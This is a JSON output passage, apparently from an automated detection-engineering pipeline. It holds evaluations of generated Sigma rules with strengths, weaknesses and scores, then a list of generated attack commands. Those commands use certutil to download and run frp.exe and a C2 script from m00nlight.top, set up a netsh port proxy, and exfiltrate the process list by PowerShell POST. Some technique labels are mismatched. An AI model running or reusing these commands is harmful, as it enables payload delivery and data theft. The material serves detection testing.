          "The rule targets a known malicious utility (at.exe) associated with adversary execution and persistence",
          "Clear mapping to MITRE ATT&CK technique T1053.002 enhances threat context",
          "Efficient detection logic using simple and performant field matching on process creation events",
          "Includes documented false positives, aiding analyst triage and reducing\u8befalert fatigue"
        ],
        "weaknesses": [
          "Detection coverage is limited due to lack of real-world verification; rule may not trigger as expected in production environment",
          "Relies solely on 'Image|endswith' without command-line arguments, potentially missing nuanced behaviors or increasing false negatives",
          "No verification performed \u2014 high risk of undetected gaps or detection failure in actual deployment"
        ],
        "suggestions": [
          "Add command-line monitoring to detect suspicious arguments (e.g., remote host targeting, reverse shells)",
          "Include additional telemetry sources such as Windows Event ID 6 (Sysmon Task Created) for broader coverage",
          "Conduct real-world testing or simulation to validate detection efficacy and tune logic accordingly",
          "Consider deprecating at.exe entirely in modern environments, as it is legacy and often unnecessary",
          "Enhance rule with user context, parent process, or network connection correlation to reduce false positives and improve fidelity"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Client Execution via MetaSploit",
        "rule_id": "ef8b9b42-52aa-468c-a4cb-58f2cb722ded",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known Metasploit-related processes and command-line indicators, which are relevant to the TTP of client-side exploitation",
          "Uses behavioral patterns such as command-line keywords (e.g., 'meterpreter', 'payload') and parent-child process relationships, increasing detection logic robustness",
          "Covers multiple execution methods (PowerShell, WScript, etc.), improving breadth of coverage",
          "Includes relevant MITRE ATT&CK tags, aiding in threat mapping and prioritization",
          "Efficient use of Sysmon process creation data with indexed fields like Image, ParentImage, and CommandLine"
        ],
        "weaknesses": [
          "No real-world verification was performed, so effectiveness against actual attacks is unproven",
          "Relies on command-line artifacts containing terms like 'msf', 'exploit', or 'payload' which may not always appear in real-world use, especially with obfuscation",
          "Potential for false positives due to legitimate use of Metasploit in testing environments or scripts referencing keywords in benign contexts",
          "Rule does not account for encoded or obfuscated command lines (e.g., base64, PowerShell -enc) commonly used with Metasploit payloads",
          "No use of additional context such as network connections, file creation, or registry modifications that could strengthen detection confidence"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to validate detection capability against actual Metasploit exploitation scenarios",
          "Enhance detection logic to include obfuscated command-line patterns (e.g., base64-encoded strings, hex encoding) often used with Metasploit payloads",
          "Add supplemental conditions such as network connection to external IPs post-execution or suspicious child processes to reduce false positives",
          "Consider adding exceptions or environment-based suppression for known testing environments where Metasploit is used legitimately",
          "Include additional telemetry such as User-Agent strings, file creation events, or DNS queries if available to improve detection fidelity"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Layer Protocol Activity via NLP Pattern Matching",
        "rule_id": "cbac0f24-312d-4d99-909d-a6682649f5d1",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule covers multiple common tools used for application layer protocol activity (e.g., certutil, bitsadmin, PowerShell, wget/curl)",
          "Detection logic includes relevant command-line indicators for data exfiltration and C2",
          "Log source is correctly specified for Windows process creation with Sysmon, enabling necessary visibility",
          "Rule includes well-documented false positives, showing awareness of operational impact"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "The rule may generate false positives due to broad CommandLine keyword matching (e.g., 'http', 'start', 'echo') without context",
          "Use of NLP pattern matching in title and tags is misleading \u2014 this is not NLP, it's basic string matching",
          "No constraints on suspicious arguments or destinations (e.g., external domains, encoded payloads), increasing false positive risk",
          "No mention of network connection events despite targeting C2/data exfiltration, limiting detection accuracy"
        ],
        "suggestions": [
          "Conduct real-world testing to validate detection capability and tune logic accordingly",
          "Refine detection logic with additional context such as destination URLs, IP addresses, or encoded command patterns",
          "Replace 'NLP pattern matching' references with accurate terminology (e.g., 'keyword-based detection') to avoid confusion",
          "Add conditions to filter out known safe usage (e.g., approved internal domains, signed scripts)",
          "Consider enriching the rule with network event correlation (e.g., network connection after process creation) to improve confidence",
          "Narrow CommandLine checks with regex or full command patterns to reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "rule_id": "3f0da8c0-a933-4743-8030-2a5e8f7610ac",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple scripting interpreters (PowerShell, cmd, WScript, Bash, Python) which increases breadth",
          "Uses behavioral patterns in command-line arguments that are commonly associated with malicious activity",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured detection logic with clear, modular selections for different interpreter types",
          "Maps to MITRE ATT&CK technique T1059 (Command and Scripting Interpreter)"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 detection effectiveness is unproven",
          "High potential for false positives due to broad command-line patterns (e.g., 'echo', '>', '|' in cmd.exe usage)",
          "Lacks specificity for Python-based detection (e.g., 'urllib', 'requests' are common in benign scripts)",
          "No use of process ancestry or user context to reduce noise",
          "Rule may miss obfuscated or novel command patterns not explicitly listed"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection capability and tune logic",
          "Narrow command-line conditions with additional context (e.g., parent process, user account, domain)",
          "Add process command-line length thresholds or entropy checks to flag obfuscation",
          "Include known malicious indicators from threat intel (if available) to increase precision",
          "Consider adding field mappings for normalized data models to improve SIEM integration"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over C2 Channel via Command Line Activity",
        "rule_id": "b5eef6f0-3ea2-4d77-88ad-0ef01c1674be",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple common exfiltration tools (certutil, bitsadmin, PowerShell, cmd)",
          "Uses specific command-line indicators that align with known exfiltration behaviors",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured detection logic with clear conditions per tool"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Risk of false positives due to broad CommandLine keyword matching (e.g., 'echo', '>', 'start')",
          "Potential for detection evasion via obfuscation not addressed",
          "Lacks specificity around C2-related destinations (e.g., external domains, suspicious IPs) which are absent from TTP info but implied"
        ],
        "suggestions": [
          "Add network-related conditions (e.g., destination IP/domain matching known C2 patterns) to increase precision",
          "Narrow CommandLine keyword matches with context (e.g., chain of commands, encoded payloads)",
          "Incorporate process command-line length or base64 detection to flag obfuscation",
          "Perform real-world testing or emulation to validate detection coverage",
          "If TTP includes specific IOCs, reference them; otherwise, avoid implying their presence"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploit Public-Facing Application via NLP Pattern Matching",
        "rule_id": "de634769-0ad0-4dc7-9efd-c4b2451a4dae",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets relevant parent processes associated with web servers (e.g., httpd.exe, w3wp.exe), which aligns with the Exploit Public-Facing Application TTP",
          "Includes a broad set of suspicious child processes commonly used in post-exploitation (e.g., powershell.exe, cmd.exe, certutil.exe)",
          "Captures known malicious command-line patterns such as '-enc', 'iex', 'DownloadString', and 'Net.WebClient'",
          "Covers alternative exploitation vectors via scripting languages like Python, Perl, PHP, and Java with relevant keywords (e.g., 'reverse shell', 'nc', 'msfvenom')",
          "Well-documented false positives, showing awareness of operational context"
        ],
        "weaknesses": [
          "No real-world verification was performed, so detection efficacy is unproven",
          "High potential for false positives due to broad CommandLine keyword matching (e.g., 'http', '80', '443') that may appear in legitimate traffic",
          "Rule generated by LangChain, raising concerns about hallucination or overfitting to patterns not reflective of real attack behaviors",
          "No specific IOCs (e.g., known malicious payloads, domains) are tied to verified exploit attempts, increasing risk of generic matching",
          "Relies heavily on command-line arguments which may be obfuscated or encoded in real attacks"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to validate detection capability against actual exploit attempts",
          "Refine CommandLine conditions to reduce generality; consider regex patterns or require multiple high-fidelity indicators",
          "Add process argument depth filtering (e.g., minimum command length, base64 decoding detection) to reduce noise",
          "Incorporate network connection follow-up logic (e.g., outbound connection from web server child process) to strengthen context",
          "If applicable, integrate known malicious hashes, IPs, or domains from threat intel to improve precision",
          "Consider splitting into multiple rules: one for web server spawning shells, another for exploit tool usage, to allow for better tuning"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Windows Management Instrumentation (WMI) Execution via Command Line",
        "rule_id": "c15b8683-9112-4956-b787-22f720eab586",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known behavioral indicators of WMI abuse, such as specific WMI query patterns and wmic.exe usage",
          "Includes contextual filtering by excluding script hosts like WmiPrvSE.exe to reduce noise",
          "Uses Sysmon process creation data, which provides rich telemetry for this detection",
          "Well-documented false positives, showing awareness of operational environment impacts"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness against actual attack behavior is unproven",
          "Detection coverage score reduced due to lack of verification (per critical guideline)",
          "Rule may miss WMI execution via other vectors (e.g., PowerShell or WMI providers abused without wmic.exe)",
          "Relies on command-line arguments containing specific strings, which can be obfuscated"
        ],
        "suggestions": [
          "Perform real-world testing or emulation to validate detection capability",
          "Expand detection logic to include WMI use via PowerShell (e.g., Get-WmiObject, Invoke-WmiMethod)",
          "Add normalization or regex patterns to detect obfuscated WMI queries",
          "Include additional telemetry sources like WMI event subscriptions (e.g., Event ID 19, 20, 21 from Microsoft-Windows-WMI-Activity/Operational)",
          "Leverage Sigma's `fields` property to ensure required fields are extracted in the target SIEM for reliable matching"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "OS Credential Dumping via NLP Pattern Matching",
        "rule_id": "f2f48975-4051-4c1c-9a8c-681e0c91beba",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple variants of OS credential dumping via command-line patterns",
          "Uses specific image and command-line indicators for lsass access and dump artifacts",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Leverages Sysmon process creation data effectively with targeted field usage",
          "Condition logic combines three detection paths, increasing breadth of coverage"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Relies on pattern matching without behavioral context, increasing risk of evasion",
          "Some command-line keywords like '/m', '-ma' may appear in non-malicious scripts or tools",
          "Generated by 'langchain' - potential for hallucinated logic or overfitting to training data",
          "Lacks process lineage depth; suspicious parent selection could trigger on benign child processes"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to validate detection capability",
          "Add file creation or network exfiltration follow-up detections to reduce false positives",
          "Refine command-line keyword matching with regex to avoid generic argument matches",
          "Include user context (e.g., non-admin user spawning ntdsutil) to improve precision",
          "Supplement with sigma rules for related behaviors like suspicious DCOM or WMI usage targeting LSASS"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Network Service Discovery via NLP Pattern Matching",
        "rule_id": "d5b72332-c8be-4e2f-a7a3-ce480d0a6a0c",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple common tools for network service discovery (net.exe, nslookup.exe, nbtstat.exe, wmic.exe)",
          "Includes relevant command-line indicators for each tool",
          "Maps to MITRE ATT&CK techniques (T1049, T1018, etc.)",
          "Acknowledges legitimate administrative use cases in false positives"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Risk of false positives due to broad command-line contains matches",
          "Lacks specificity for SMB-related selection (selection_smb) which could trigger on benign file share access",
          "Uses 'attack.discovery' tag but tactic field in TTP is empty, indicating incomplete mapping"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Narrow command-line conditions with more specific patterns or regex to reduce false positives",
          "Add source IP, user context, or process parent/child relationships to increase fidelity",
          "Improve completeness by populating TTP tactic field (e.g., 'Discovery')",
          "Consider splitting into multiple rules or using thresholds/aggregation to distinguish normal admin behavior from malicious use"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Command Line Tools",
        "rule_id": "eae662db-b034-4600-b6aa-add381110be0",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command-line archiving tools (PowerShell, 7-Zip, tar, zip, makecab), increasing breadth of detection",
          "Specific command-line arguments are targeted (e.g., 'Compress-Archive', '-cf', '-r', 'a'), aligning with known archiving behaviors",
          "Log source is well-defined (Sysmon process creation on Windows), ensuring relevant data scope",
          "False positives are thoughtfully documented, acknowledging legitimate administrative and development use cases",
          "Rule is mapped to MITRE ATT&CK technique T1560 (Archive Collected Data), improving threat context"
        ],
        "weaknesses": [
          "Detection coverage is unverified in a real SIEM environment \u2014 no verification run performed, which introduces uncertainty in effectiveness",
          "The rule may miss obfuscated or encoded command lines (e.g., base64-encoded PowerShell), which are common in real attacks",
          "No normalization or case-insensitive matching for command-line arguments, risking evasion via casing variations (e.g., 'ZIP -R')",
          "Some selections (e.g., 7z.exe with 'a') are overly broad and may miss context (e.g., archive name, target paths), increasing false negatives",
          "No use of parent-child process context (e.g., cmd spawning 7z.exe) to reduce false positives or improve detection logic"
        ],
        "suggestions": [
          "Conduct real-world emulation testing to validate detection coverage and tune the rule based on observed behavior",
          "Add case-insensitive modifiers (e.g., |i) to CommandLine conditions to prevent simple evasion",
          "Enhance detection logic with process ancestry (e.g., parent process image) to distinguish suspicious from legitimate usage",
          "Include additional indicators such as file output paths (e.g., temp directories) or large archive sizes if available in logs",
          "Consider adding support for detecting archive tools in other execution chains (e.g., WSL tar, PowerShell Core) and alternative syntax (e.g., -archivePath, -destinationpath)",
          "Implement thresholding or frequency-based detection to reduce false positives from automated scripts while catching bulk data archiving"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Scheduled Task Creation via Command Line Tools",
        "rule_id": "3b66dcce-f412-484e-b6a5-cec788fd31d2",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Targets known command-line tools (schtasks.exe, at.exe) associated with Scheduled Task creation",
          "Uses Sysmon process creation logs which provide rich telemetry",
          "Includes relevant tags mapping to MITRE ATT&CK technique T1053.005",
          "Condition logic is simple and efficient, using basic OR condition between two clear selections",
          "Acknowledges legitimate administrative use in false positives list"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness is unproven",
          "Relies solely on command-line arguments which can be easily obfuscated",
          "at.exe is deprecated and rarely used in modern environments, reducing coverage",
          "No detection of alternative methods (e.g., PowerShell, WMI, or COM interfaces) for scheduled task creation",
          "Rule may miss encoded or split command lines"
        ],
        "suggestions": [
          "Conduct real-world testing to validate detection capability",
          "Expand detection logic to include PowerShell (e.g., New-ScheduledTask, Register-ScheduledTask)",
          "Add detection for wmic.exe and other process creation methods for scheduled tasks",
          "Include checks for suspicious parent processes (e.g., cmd.exe spawned from non-system processes)",
          "Enhance CommandLine filtering to detect obfuscation patterns or encoded commands",
          "Consider using Sigma's field name aliases for better cross-platform compatibility"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Account Discovery via Command Line Tools",
        "rule_id": "252ef574-c8c7-4ae7-8b11-8a56839c80d2",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple common command-line tools used for account discovery (net.exe, dsquery.exe, wmic.exe)",
          "Targets specific command-line arguments indicative of user/group enumeration",
          "Uses Sysmon process creation data, which is reliable for visibility into execution behavior",
          "Includes relevant MITRE ATT&CK tagging (T1087 - Account Discovery)"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Rule may miss variations in tool usage (e.g., obfuscated commands, alternative tools)",
          "Potential for false positives from legitimate admin activity, as acknowledged in falsepositives list",
          "No normalization or handling of case sensitivity or command-line encoding (e.g., wmic vs WMIC)"
        ],
        "suggestions": [
          "Conduct real-world testing or emulation to verify detection capability",
          "Add case-insensitive matching for command-line arguments",
          "Consider adding baselining or thresholding to reduce false positives from authorized admin tools",
          "Include additional account discovery tools (e.g., PowerShell Get-ADUser, nltest)",
          "Enrich with context such as user privilege level or source IP to improve signal-to-noise ratio"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Services Activity via Common Administration Tools",
        "rule_id": "4549a407-0835-434b-888c-9513ba152441",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Covers multiple common tools associated with Remote Services lateral movement (sc.exe, psexec.exe, wmic.exe, etc.)",
          "Uses specific command-line indicators to increase detection fidelity",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Leverages Sysmon process creation logs for high-fidelity visibility",
          "Condition logic is clear and modular across tool types"
        ],
        "weaknesses": [
          "No real-world verification performed, so effectiveness is unproven",
          "Detection coverage score reduced due to lack of verification (CRITICAL requirement not met)",
          "Some command-line arguments (e.g., '\\', 'config') may be too generic and lead to false positives",
          "No normalization or consideration of obfuscation techniques (e.g., encoded commands, alternative syntax)"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability against the Remote Services TTP",
          "Add additional filtering to reduce false positives (e.g., exclude known admin hosts or service accounts)",
          "Include detection logic for obfuscated or encoded command-line usage (e.g., base64, -EncodedCommand in PowerShell)",
          "Consider adding network-based correlation (e.g., remote IP connections) to increase confidence",
          "Refine CommandLine conditions to avoid overly broad contains matches (e.g., use regex or full phrase matching where possible)"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Screen Capture Activity Detection",
        "rule_id": "c21eb8ea-f6a3-4be5-8aea-aa2ff90b7bd3",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple known screen capture tools (Snipping Tool, Greenshot, nircmd, ffmpeg)",
          "Includes generic command-line keyword detection for broader coverage",
          "Well-documented false positives to guide tuning",
          "Uses specific Sysmon process creation events which are reliable for this TTP",
          "Tags aligned with MITRE ATT&CK (T1113) and custom categories"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Generic command-line keywords (e.g., 'screen', 'capture') may trigger on benign activity",
          "Rule may miss obfuscated or novel tools not explicitly listed",
          "Relies on exact Image path endings, which attackers can rename to evade"
        ],
        "suggestions": [
          "Conduct real-world testing to validate detection capability",
          "Add process command-line normalization or regex patterns to detect obfuscation",
          "Include additional tools commonly used for screen capture (e.g., ShareX, Lightshot)",
          "Consider adding file creation events (e.g., PNG/JPEG writes post-capture) as secondary detection logic",
          "Improve specificity of generic selection by requiring multiple keywords or context"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Persistence via Registry Run Keys Modification",
        "rule_id": "65fb4ceb-8d95-4068-a7b7-d7dae60edc45",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets known persistence mechanisms via Registry Run Keys using common tools like reg.exe and PowerShell",
          "Includes relevant false positives in the documentation, showing awareness of operational impact",
          "Uses precise CommandLine and Image conditions to narrow detection scope",
          "Covers both HKLM and HKCU registry hives for broader coverage of the technique"
        ],
        "weaknesses": [
          "No real-world verification performed, so detection efficacy is unproven",
          "Relies solely on command-line patterns which may be evaded by obfuscation or alternative tools",
          "Does not account for other methods of modifying Run keys (e.g., WMI, .NET, or remote registry tools)",
          "Potential for false positives from legitimate software installers and admin scripts, despite listing them"
        ],
        "suggestions": [
          "Conduct real-world testing or simulation to verify detection capability",
          "Enhance detection logic to include additional process creation indicators (e.g., parent-child process relationships)",
          "Add support for detecting equivalent PowerShell obfuscation techniques or use of Invoke-Command",
          "Consider enriching the rule with additional context such as user privilege level or unusual execution time",
          "Replace 'unknown' TTP ID with correct MITRE ATT&CK ID (T1547.001) for completeness"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Remote Desktop Protocol (RDP) Activity Detection",
        "rule_id": "646367a9-d1a5-4725-9274-7730813d38e0",
        "quality_score": 0.575,
        "status": "fail",
        "strengths": [
          "The rule covers multiple vectors for RDP-related activity, including GUI and command-line tools.",
          "It includes relevant process creation monitoring via Sysmon, which is effective for detecting execution-based behaviors.",
          "The inclusion of command-line arguments (e.g., -ComputerName, Enter-PSSession) helps target suspicious PowerShell usage.",
          "False positives are well-documented, showing awareness of operational impact."
        ],
        "weaknesses": [
          "Detection coverage is low due to lack of real-world verification \u2014 rule has not been tested against actual attack data.",
          "The rule may miss lateral movement via RDP if adversaries use alternate tools or obfuscation techniques not covered (e.g., renamed binaries, WMI execution).",
          "PowerShell detection relies on clear-text keywords that can be easily bypassed with obfuscation.",
          "No verification result means confidence in efficacy is low; potential hallucination in assuming these command-line patterns are reliably present during malicious use."
        ],
        "suggestions": [
          "Conduct real-world testing of the rule using simulated RDP-based lateral movement to validate detection capability.",
          "Enhance detection logic with additional indicators such as parent-child process relationships (e.g., wmiexec spawning mstsc).",
          "Add support for detecting obfuscated PowerShell commands using script block logging or AMSI integration.",
          "Consider incorporating network-based indicators (e.g., Event ID 4624 with Logon Type 10) to complement process creation events.",
          "Tune false positives by adding exclusions for known administrative hosts or user accounts where appropriate."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Office Process Spawning Command Shells (Phishing)",
        "rule_id": "18f0a0c9-06c2-4556-94e1-0fb1ac849385",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "Specific detection logic for suspicious command-line arguments like '-enc' and 'Invoke-WebRequest' which are commonly used in malicious macro payloads",
          "Covers multiple Office applications (WINWORD, OUTLOOK) and multiple spawning behaviors (cmd.exe, powershell.exe)",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Well-structured Sigma format with clear conditions and field usage",
          "Tags aligned with MITRE ATT&CK (T1566 - Phishing), improving threat context"
        ],
        "weaknesses": [
          "No real-world verification performed \u2014 rule effectiveness is unproven in actual environment",
          "Detection coverage score reduced due to lack of verification; rule may not trigger as expected on real attack data",
          "Limited parent process coverage: only WINWORD and OUTLOOK; excludes other Office apps like EXCEL or MSTSC",
          "Potential for false positives not fully mitigated \u2014 legitimate macros or admin scripts could still trigger alert",
          "Relies on Sysmon event collection; assumes CommandLine logging is enabled, which may not be universal"
        ],
        "suggestions": [
          "Perform real-world testing or simulation to verify detection capability against known phishing payloads",
          "Expand parent image selection to include other Office processes like EXCEL.EXE, POWERPNT.EXE",
          "Add additional filtering on CommandLine to exclude known benign patterns (e.g., trusted paths, signed scripts)",
          "Include process command-line length or entropy checks to better identify obfuscated payloads",
          "Ensure environment has Sysmon with Event ID 1 (Process Creation) and Command Line arguments fully logged"
        ],
        "metrics": {
          "accuracy": 0.4,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-21T19:19:21.245063",
      "source_agent": "7e27d14c-f90b-48c5-a0b8-cb7051f90aa7",
      "target_agent": "rulegen",
      "average_quality_score": 0.624,
      "total_rules_evaluated": 31,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.6241935483870967,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "No real-world verification performed, so detection efficacy is unproven",
        "No real-world verification performed \u2014 rule effectiveness is unproven in actual environment",
        "Detection coverage score reduced due to lack of verification (CRITICAL requirement not met)",
        "No real-world verification was performed, so detection efficacy is unproven",
        "No real-world verification performed, so effectiveness is unproven"
      ],
      "actionable_suggestions": [
        "Conduct real-world testing or simulation to verify detection capability",
        "Conduct real-world testing to validate detection capability",
        "Conduct real-world testing or simulation to validate detection capability and tune the rule based on observed behavior",
        "Remove or contextualize 'm00nlight.top' unless it is a known IOA tied to the TTP; otherwise, it may cause missed detections or false negatives",
        "Consider adding file hash or signed/unsigned binary checks to improve precision"
      ]
    }
  },
  "attacks": [
    {
      "id": "982ca9ab-9d09-42d1-93ac-075916fd3736",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100:8080/frp.exe %TEMP%\\\\frp.exe && %TEMP%\\\\frp.exe -c %TEMP%\\\\frp.ini",
      "description": "Download and execute a proxy tool (e.g., FRP) using certutil and run with config",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads frp.exe from local attacker-controlled server, saves to temp, and executes using a local config file for reverse proxy setup. Leaves forensic traces in file system.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.038717",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "85b59348-54e5-4c39-9bf3-e7190fad52f6",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process netsh -ArgumentList 'interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.1.100 connectport=443' -Verb RunAs\"",
      "description": "Create a local port proxy using built-in netsh portproxy feature for traffic redirection",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Sets up a SOCKS-like port proxy on port 8080 redirecting traffic to 192.168.1.100:443. Requires admin rights. No files written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.038717",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "dcfef2e7-4123-414e-b166-7a7f9b2b3c39",
      "ttp_id": "unknown",
      "technique_id": "T1090",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& 'C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\whoami.exe' ; $b64 = 'VwByAGkAdABlAC0ASABvAHMAdAAgACcASQBtAGEAZwBuAGUAdAAgAHAAcgBvAHgAeQAgAHMAdQBwAHAAcgBlAHMAcwBlAGQAJwAgAA==' ; Invoke-Expression ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64)))\"",
      "description": "Simulate proxy execution via encoded PowerShell command using built-in binaries and obfuscation",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Runs whoami as a benign check, then decodes and executes a harmless Write-Host message indicating 'Imaginet proxy suppressed'. No actual proxy established. Safe for detection testing.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.038717",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "aef2dec4-da50-4dc6-82fd-b07e240e5d2d",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://m00nlight.top/c2.js c:\\temp\\c2.js",
      "description": "Download C2 JavaScript payload from malicious domain using certutil, a built-in Windows binary commonly abused for file downloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from m00nlight.top and saves it to c:\\temp\\c2.js. Will fail if network is blocked or path doesn't exist, but leaves no persistent changes.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.851968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f3bc68eb-cc55-47ee-b491-12e1b9f08346",
      "ttp_id": "unknown",
      "technique_id": "T1048",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://m00nlight.top/proxy.php' -Method POST -Body (Get-Process | ConvertTo-Json) -UseBasicParsing -ErrorAction SilentlyContinue\"",
      "description": "Exfiltrate running process list to attacker-controlled proxy server using PowerShell.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends a JSON payload of running processes to m00nlight.top via HTTP POST. Fails silently if blocked. Uses -UseBasicParsing to avoid dependency on Internet Explorer engine.",
      "source": "langchain",
      "generated_at": "2025-12-21T18:24:38.851968",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "90757aa6-863f-4577-bc1e-1f17046d845d",
      "ttp_id": "unknown",
      "technique_id": "T1086",
      "technique_name": "Proxy",
      "tactic": "execution",
      "platform": "windows",
